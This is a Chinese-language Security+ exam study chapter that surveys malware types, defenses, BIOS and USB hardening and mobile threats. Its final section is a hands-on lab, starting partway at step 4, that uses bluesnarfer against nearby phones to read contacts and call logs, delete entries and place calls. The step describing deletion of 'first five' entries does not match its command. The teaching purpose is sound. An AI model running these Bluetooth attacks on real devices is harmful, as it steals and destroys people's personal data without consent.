## 其他恶意软件

除了病毒之外，还有其他类型的恶意软件（称为恶意代码/恶意软件，malware），为了应对现实世界和通过 Security+ 认证考试，你需要熟悉这些类型。在本节中，你将了解间谍软件、广告软件和根工具包等，这些只是当今威胁系统的常见恶意软件类型中的一部分。

### 间谍软件

*间谍软件* 是隐藏的软件，它监视并收集关于你及你活动的信息，然后将这些信息发送到远程系统供黑客查看。例如，间谍软件可能会收集你的上网习惯信息。间谍软件不仅能监视信息，还能对系统进行更改，例如浏览器重定向（将你发送到不同的网页）和降低网络连接速度。

### 广告软件

*广告软件* 是会在屏幕上自动加载广告的软件，通常以弹出窗口的形式出现。广告旨在诱导你购买产品或订阅网站。

### 垃圾邮件

*垃圾邮件* 是指你收到的任何未经请求的商业电子邮件。这些电子邮件通常是群发的，试图让你购买产品或服务。发送垃圾邮件的人（发送垃圾邮件的人）通常在你向新闻组发布评论后，从网站或新闻组获取你的电子邮件地址，或者发送垃圾邮件的人从收集了电子邮件地址的公司在线购买电子邮件列表。

发送垃圾邮件的人使用称为 *垃圾邮件机器人 (spambots)* 的自动化程序爬取网站，收集发布在上面的任何电子邮件地址。一旦发送垃圾邮件的人收集到足够多的电子邮件地址，他们就会通过向所有地址发送消息来寻找业务机会。

公司可以通过不在网站上发布电子邮件地址来防范垃圾邮件；如果必须显示电子邮件地址，可以将其放在显示的图形文件中。垃圾邮件机器人无法从图形文件中检索电子邮件地址，因为页面上没有文本形式的地址。

### 根工具包

*根工具包* 是黑客安装在系统上的软件，通常对管理员隐藏，并授予黑客对系统的特权访问。以下是根工具包的五种主要类型：

- **应用程序级** 应用程序级根工具包是一种用户模式可执行文件，授予黑客对系统的访问权限。应用程序级根工具包的例子包括木马病毒。

- **库级** 库级根工具包不是可执行文件，而是一组可由应用程序调用的代码库。库级根工具包是运行在用户模式下的 `DLL` 文件，通常会替换系统上的某个 `DLL` 以隐藏自身。

- **内核级** 内核级 Rootkit 是由操作系统内核加载的 Rootkit，通常通过替换系统上的设备驱动文件来植入系统。内核级 Rootkit 运行在内核模式而非用户模式，这意味着它拥有比用户模式 Rootkit 更高的权限，因此对系统有更大的访问权限，并可能造成更大的破坏。

- **虚拟化** 虚拟化 Rootkit 是一种在系统启动时取代操作系统加载的 Rootkit。随后，该 Rootkit 会在虚拟化环境中加载真正的操作系统。这类 Rootkit 很难被检测到，因为操作系统不知道自己正运行在虚拟化环境中，且操作系统中没有任何应用程序代码或 `DLL` 被替换。

- **固件** 固件 Rootkit 存储在系统或设备的固件代码中，难以检测，因为它不存在于操作系统中。

### 僵尸网络

*僵尸网络* 是一组被黑客攻陷的系统的集合，随后被用于协助执行其他类型的攻击。僵尸网络中受黑客控制的系统被称为 *僵尸系统* 或 *僵尸主机*，因为它们没有自己的“思想”，只会执行黑客的命令。

![Image](img/exam.jpg)

**针对 Security+ 考试，请了解僵尸网络是由黑客控制的一组系统，用于对互联网上的系统发起攻击。**

僵尸网络可用于多种目的，例如发送垃圾邮件或对特定目标发起拒绝服务攻击。一旦黑客控制了许多系统，黑客就可以出租僵尸网络的服务，利用僵尸网络中的所有系统发起攻击。

### 远程访问木马

*远程访问木马* 是一种恶意软件，用户通常在不知情的情况下安装它，例如从互联网安装游戏或运行通过电子邮件发送的程序。RAT 程序随后会为攻击者打开一个后门，以便稍后远程访问该系统。RAT 恶意软件允许攻击者连接到系统并在该系统上远程运行命令。如果网络上的某个系统正在运行 RAT，黑客可能会利用它来攻陷其他系统，从而实际上创建了一个僵尸网络。

### 键盘记录器

键盘记录器是一种软件或硬件设备，旨在捕获系统上的所有按键。作为硬件，键盘记录器是一个连接到键盘线缆然后再连接到计算机的小型设备（参见 图 5-7）。通常，黑客会进入设施并将键盘记录器连接到系统。一旦设备连接在键盘和计算机之间，该系统上的任何按键都会被捕获并存储在设备上。黑客随后回来取回设备。

### 后门

当黑客攻陷系统时，他们通常会在系统上安装一个 *后门*，以便稍后访问该系统。黑客安装后门是因为他们知道最初用于攻陷系统的方法可能稍后会被阻断，因此他们创建了一种访问系统的替代方法。黑客可能会使用木马病毒、通过软件在系统上打开一个端口，或在系统上创建一个用户账户作为他们稍后用来访问系统的后门。

### 勒索软件

当今发现的另一种恶意软件是 *勒索软件*。勒索软件是当今常见的恶意软件，当在您的系统上运行时，它会加密硬盘的内容，而黑客是唯一拥有解密密钥的人——他们实际上劫持了您的数据，直到您支付赎金。黑客通常希望收到比特币付款，因为它更难追踪。如果您决定不支付，您将需要彻底擦除系统并从备份中恢复数据。

### 潜在有害程序

Security+ 考试要求您理解 *潜在有害程序* 的概念，简称 PUP。PUP 是安装在您系统上但您不想要的软件，它之所以被安装是因为它与您实际想要并安装的另一个程序捆绑在一起。PUP 会做许多恼人的事情，例如显示广告、安装工具栏、可能降低计算机速度，并可能收集您的私人信息。为了防范 PUP，您在安装软件时应仔细观察每个屏幕，确保禁用了安装附加软件的选项，并务必运行反恶意软件。

## 无文件病毒

无文件病毒是一种不在您的系统上安装任何文件的恶意软件，而是在系统内存中运行。该恶意软件通常与另一个程序相关联，以便当您运行该程序时，恶意软件被加载到内存中并从内存运行。

### 命令与控制

Security+ 考试还将测试您对命令与控制的了解，这是指攻击者攻陷一个系统（或系统网络）并在其上加载恶意软件。然后攻击者使用命令与控制服务器向运行恶意软件的系统发送命令，以便攻击者执行诸如从系统检索敏感数据和破坏系统功能等任务。

## 加密恶意软件

加密恶意软件是一种恶意软件，它在用户不知情的情况下加密用户的文件，然后通常充当勒索软件，通知用户需要支付费用才能解密文件。用户通常被诱骗在其系统上安装加密恶意软件，一旦安装，该软件就会执行加密。一旦文件被软件加密，用户就无法访问这些文件，直到他们支付赎金并解锁文件。

### 多态恶意软件和装甲病毒

针对 Security+ 认证考试，您还应熟悉其他两种恶意软件：多态恶意软件和装甲病毒。*多态恶意软件* 是一种通过自我修改来避免被拥有该恶意软件定义的防病毒软件检测到的恶意软件。因为恶意软件发生了变异，所以防病毒软件中的定义变得无效。

*装甲病毒* 是一种保护自己不被安全专业人员分析的病毒。安全人员通常会反编译病毒代码以更好地了解病毒的工作原理。装甲病毒使得反编译程序和查看病毒代码变得困难。

### 防范恶意软件

对于 Security+ 认证考试，你需要了解不同类型的恶意软件，同时也需要知道如何防范恶意软件。以下是针对恶意软件的对策列表：

- **使用防病毒软件。** 确保在所有桌面客户端和服务器上都使用防病毒软件。确保防病毒软件支持实时保护，以便在你访问数据时扫描文件和内存中的病毒。

- **保持病毒定义库为最新。** 病毒定义数据库是已知病毒的列表，保持该数据库为最新至关重要，这样你的防病毒软件才能知晓最新的病毒。

- **密切监视监听端口。** 你可以在 Windows 和 Linux 中使用 `netstat` 命令来查看监听端口的列表。

- **密切监视运行中的进程。** 你可以在 Windows 中使用 `tasklist` 命令，或在 Linux 中使用 `ps -A` 命令来查看运行中进程的列表。密切关注后台运行的进程非常重要。

- **养成良好的上网习惯。** 教育用户远离未知网站，并且不要打开来自未知来源的电子邮件中的附件。

如果你正在寻找一些免费软件来帮助防范恶意软件，甚至清除恶意软件，可以使用以下工具：

- **Windows Defender** 这是微软在所有受支持的操作系统中内置的病毒防护、间谍软件防护和恶意软件防护软件。与其他防病毒软件一样，Windows Defender 提供针对恶意软件的实时保护。

- **Microsoft Malicious Software Removal Tool（微软恶意软件删除工具）** 如果你的系统已被感染，可以从微软下载恶意软件删除工具，该工具会定期更新。它是帮助从受感染系统中清除恶意软件的绝佳工具。

还有一点必须说明：如果你发现系统已被感染，则不能信任在该受感染系统上运行的任何软件，包括防病毒软件。在这种情况下，你需要从一个拥有自己操作系统和防病毒软件的 Live 光盘或 USB 启动盘启动系统。一旦从 Live OS 启动，你就可以从 Live OS 启动防病毒软件来扫描系统并清除病毒。

### 针对硬件的威胁

在保护系统时，你不仅需要担心恶意软件等系统威胁，还需要担心系统中应当加以保护的硬件相关特性。在本节中，你将了解用于妥善保护系统的常见硬件特性。

#### BIOS 设置

计算机中的 BIOS 芯片包含用于与系统中的硬件通信的低级代码。BIOS 代码还包含所谓的 *CMOS 设置程序*，这是一个用于配置系统硬件设置的程序，例如系统中的内存和驱动器类型、计算机的日期和时间。

就安全性而言，CMOS 设置程序（如图 5-8 所示）可用于控制可从哪些设备启动。一项安全最佳实践是确保系统只能从本地硬盘启动，而不能从网卡、USB 驱动器或系统上存在的光驱启动。有人使用 Live 光盘（包含可启动操作系统的 USB 驱动器或 DVD）将操作系统引导至内存以获取系统访问权限，这实在太容易了。为确保这种情况不发生，请配置 CMOS 仅允许从硬盘启动（如果可能）。

![Image](img/f0208-01.jpg)

图 5-8  

使用 CMOS 设置帮助保护系统

在 CMOS 设置程序中，你还可以设置“用户”密码，即使用系统所需的密码。不要将此密码与 Windows 密码混淆，因为 CMOS 密码出现在操作系统加载*之前*。此外，请务必设置“管理员”密码，即当有人想要更改 CMOS 设置时所需的密码。

如果你担心人们将未经授权的设备连接到计算机，并可能利用它们带走数据或通过未经授权的设备危害系统，则应确保通过 CMOS 设置程序禁用不必要的端口。

#### USB 设备

关于端口，更新安全策略并教育用户哪些类型的数据允许放置在 USB 驱动器上非常重要。因为员工很容易将数据副本保存在闪存驱动器上带走，所以安全策略必须明确规定允许将哪些数据类型放置在 USB 驱动器上。在高安全环境中，你可能会决定禁用 USB 端口，使其无法使用。

![Image](img/exam.jpg)

**由于蠕虫病毒已知会从拇指驱动器复制到系统，你应该考虑禁用办公室系统上的 USB 端口。**

使用 USB 闪存驱动器的一个重要风险是：员工的家庭系统可能感染了病毒，当他们将 USB 驱动器插入自家系统时，蠕虫病毒就会复制到闪存驱动器上。从商业角度来看，这一安全隐患在于：如果员工将该闪存驱动器带到办公室并连接到系统，病毒可能会复制到工作系统中。

#### 智能手机和平板电脑

智能手机和平板电脑等移动设备是当今业务运营中的关键设备。大多数员工在入职时都会获得一部手机或平板电脑，保护移动设备上的数据安全非常重要。现在的大多数手机被称为智能手机，因为它们的功能不仅限于打电话。它们存储业务联系信息和敏感文档，并拥有数据套餐，允许连接互联网以查收邮件和浏览网页。

从安全角度来看，确保员工在不使用智能手机和平板电脑时将其锁定，并对这些设备上的数据进行加密。这将防止公司机密数据在员工手机丢失或被盗时被公司外部人员查看。

作为安全专业人员，你应该研究公司员工使用的所有移动设备的漏洞。熟悉公司使用的所有设备的功能，并了解这些产品各自存在的不同漏洞，这非常重要。

由于当今大多数移动设备都使用蓝牙——一种无线技术，允许一台蓝牙设备在短距离内（最多 30 英尺）与另一台蓝牙设备通信——如果启用了蓝牙，黑客很容易与你的手机通信并窃取其中的数据。现在的手机容易受到各种攻击，包括以下几种：

- **Bluesnarfing（蓝牙窃取）** 一种蓝牙漏洞利用，允许黑客连接到启用了蓝牙的手机并从中检索数据

- **Bluejacking（蓝牙骚扰）** 从一台蓝牙设备向另一台蓝牙设备发送未经请求的消息

- **Bluebugging（蓝牙漏洞攻击/蓝牙劫持）** 一种蓝牙漏洞利用，涉及黑客获取手机访问权限并利用其全部功能，包括使用手机上的 AT 命令集拨打电话

![Image](img/p0210-01.jpg)

4. 你应该能看到已安装的蓝牙适配器列表。每个适配器都有一个以 `hci` 为前缀的索引号。例如，第一个适配器是 `hci0`，而第二个适配器是 `hci1`。记录适配器编号： \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

![Image](img/f0210-01.jpg)

5. 查看蓝牙适配器时，你应该会注意到第二行有“down”一词。这意味着适配器已禁用。要启用适配器，请输入

```
hciconfig hci0 up
```

![Image](img/p0210-02.jpg)

6. 一旦启用了蓝牙设备，你就可以开始扫描其他蓝牙设备。要扫描你附近的蓝牙设备，请在 `hcitool` 命令上使用 `scan` 选项，然后将上一步中获得的蓝牙适配器索引号作为参数传递。要扫描蓝牙设备，请输入

```
hcitool -i hci0 scan
```

![Image](img/p0210-03.jpg)

![Image](img/f0210-02.jpg)

7. 扫描应会向你报告所有靠近你的蓝牙设备及其 MAC 地址。记录你找到的蓝牙设备的 MAC 地址： \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

8. 一旦你有了蓝牙设备的 MAC 地址，就可以使用 `bluesnarfer` 命令来检索关于该蓝牙设备的信息。要查看手机上的地址列表，请输入

```
bluesnarfer -r 1-50 -b <MAC_ADDRESS>
```

![Image](img/p0211-01.jpg)

9. 注意 `-r` 用于读取第 1 到 50 条记录，而 `-b` 是用于指定要利用的设备 MAC 地址的开关。

![Image](img/f0211-01.jpg)

10. 然后你可以使用 `bluesnarfer` 命令通过输入以下内容来查看手机上的来电记录（注意 `RC` 指定你希望查看来电记录）：

```
bluesnarfer -r RC -b <MAC_ADDRESS>
```

![Image](img/p0211-02.jpg)

![Image](img/f0211-02.jpg)

11. 要使用 `bluesnarfer` 从通讯录中删除前五个电话簿条目，请输入

```
bluesnarfer -r 1-50 -b <MAC_ADDRESS> --delete
```

![Image](img/p0211-03.jpg)

![Image](img/f0211-03.jpg)

12. 要从 BackTrack 系统使用被攻破的手机拨打电话，请输入

```
bluesnarfer -b <MAC_ADDRESS> --dial <PHONE_NUMBER>
```

![Image](img/p0212-01.jpg)
